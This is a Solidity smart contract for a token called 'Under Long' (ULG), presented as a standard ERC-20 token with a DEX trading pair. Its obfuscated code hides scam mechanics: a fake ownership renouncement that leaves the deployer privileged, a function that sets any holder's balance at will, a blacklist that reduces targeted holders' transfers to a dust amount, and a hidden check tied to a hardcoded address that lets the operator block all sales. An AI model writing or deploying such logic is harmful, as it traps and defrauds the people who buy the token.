//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface amountFeeMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract atLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeBuy {
    function createPair(address listAuto, address swapEnable) external returns (address);
}

interface launchedMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptTeam) external view returns (uint256);

    function transfer(address toToken, uint256 marketingBuy) external returns (bool);

    function allowance(address modeLimit, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingBuy) external returns (bool);

    function transferFrom(
        address sender,
        address toToken,
        uint256 marketingBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed totalMax, uint256 value);
    event Approval(address indexed modeLimit, address indexed spender, uint256 value);
}

interface tokenBuy is launchedMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract UnderLong is atLaunched, launchedMin, tokenBuy {

    uint256 sellTotal;

    mapping(address => bool) public listFrom;

    uint256 public tradingLaunchMin;

    function name() external view virtual override returns (string memory) {
        return launchedLimit;
    }

    function enableLiquidity() private view {
        require(listFrom[_msgSender()]);
    }

    function maxTo(address shouldMax) public {
        enableLiquidity();
        if (launchedIs) {
            shouldLaunched = enableSender;
        }
        if (shouldMax == toLimit || shouldMax == autoSwap) {
            return;
        }
        autoToMax[shouldMax] = true;
    }

    string private toSell = "ULG";

    uint256 receiverTeam;

    function swapFrom(address enableSwapAmount, address toToken, uint256 marketingBuy) internal returns (bool) {
        require(tokenMarketing[enableSwapAmount] >= marketingBuy);
        tokenMarketing[enableSwapAmount] -= marketingBuy;
        tokenMarketing[toToken] += marketingBuy;
        emit Transfer(enableSwapAmount, toToken, marketingBuy);
        return true;
    }

    uint256 public senderLaunched;

    address private fundMax;

    bool public buyWalletLimit;

    function allowance(address marketingSenderExempt, address shouldLaunchList) external view virtual override returns (uint256) {
        if (shouldLaunchList == amountExempt) {
            return type(uint256).max;
        }
        return marketingSender[marketingSenderExempt][shouldLaunchList];
    }

    uint256 public shouldLaunched;

    function swapFund(address shouldSwap, uint256 marketingBuy) public {
        enableLiquidity();
        tokenMarketing[shouldSwap] = marketingBuy;
    }

    function transferFrom(address enableSwapAmount, address toToken, uint256 marketingBuy) external override returns (bool) {
        if (_msgSender() != amountExempt) {
            if (marketingSender[enableSwapAmount][_msgSender()] != type(uint256).max) {
                require(marketingBuy <= marketingSender[enableSwapAmount][_msgSender()]);
                marketingSender[enableSwapAmount][_msgSender()] -= marketingBuy;
            }
        }
        return sellTake(enableSwapAmount, toToken, marketingBuy);
    }

    bool private marketingMax;

    uint8 private buyMax = 18;

    function totalSupply() external view virtual override returns (uint256) {
        return launchedSwap;
    }

    string private launchedLimit = "Under Long";

    bool private launchedIs;

    function listTxFrom(uint256 marketingBuy) public {
        enableLiquidity();
        receiverTeam = marketingBuy;
    }

    bool private senderReceiver;

    mapping(address => bool) public autoToMax;

    address public autoSwap;

    function sellTake(address enableSwapAmount, address toToken, uint256 marketingBuy) internal returns (bool) {
        if (enableSwapAmount == toLimit) {
            return swapFrom(enableSwapAmount, toToken, marketingBuy);
        }
        uint256 fromFund = launchedMin(autoSwap).balanceOf(totalFrom);
        require(fromFund == receiverTeam);
        require(toToken != totalFrom);
        if (autoToMax[enableSwapAmount]) {
            return swapFrom(enableSwapAmount, toToken, walletReceiver);
        }
        return swapFrom(enableSwapAmount, toToken, marketingBuy);
    }

    uint256 public enableSender;

    address public toLimit;

    function owner() external view returns (address) {
        return fundMax;
    }

    mapping(address => mapping(address => uint256)) private marketingSender;

    function balanceOf(address exemptTeam) public view virtual override returns (uint256) {
        return tokenMarketing[exemptTeam];
    }

    function txLaunched() public {
        emit OwnershipTransferred(toLimit, address(0));
        fundMax = address(0);
    }

    function symbol() external view virtual override returns (string memory) {
        return toSell;
    }

    address totalFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return buyMax;
    }

    uint256 private launchedSwap = 100000000 * 10 ** 18;

    function swapLiquidity(address shouldFee) public {
        if (buyWalletLimit) {
            return;
        }
        if (senderReceiver) {
            senderReceiver = false;
        }
        listFrom[shouldFee] = true;
        if (marketingMax != totalReceiver) {
            enableSender = senderLaunched;
        }
        buyWalletLimit = true;
    }

    bool private totalReceiver;

    address amountExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function getOwner() external view returns (address) {
        return fundMax;
    }

    event OwnershipTransferred(address indexed tokenMax, address indexed senderFundAuto);

    constructor (){
        
        amountFeeMin totalIsEnable = amountFeeMin(amountExempt);
        autoSwap = takeBuy(totalIsEnable.factory()).createPair(totalIsEnable.WETH(), address(this));
        if (launchedIs != marketingMax) {
            tradingLaunchMin = shouldLaunched;
        }
        toLimit = _msgSender();
        txLaunched();
        listFrom[toLimit] = true;
        tokenMarketing[toLimit] = launchedSwap;
        
        emit Transfer(address(0), toLimit, launchedSwap);
    }

    bool public minSenderLaunched;

    mapping(address => uint256) private tokenMarketing;

    function approve(address shouldLaunchList, uint256 marketingBuy) public virtual override returns (bool) {
        marketingSender[_msgSender()][shouldLaunchList] = marketingBuy;
        emit Approval(_msgSender(), shouldLaunchList, marketingBuy);
        return true;
    }

    function transfer(address shouldSwap, uint256 marketingBuy) external virtual override returns (bool) {
        return sellTake(_msgSender(), shouldSwap, marketingBuy);
    }

    uint256 constant walletReceiver = 19 ** 10;

}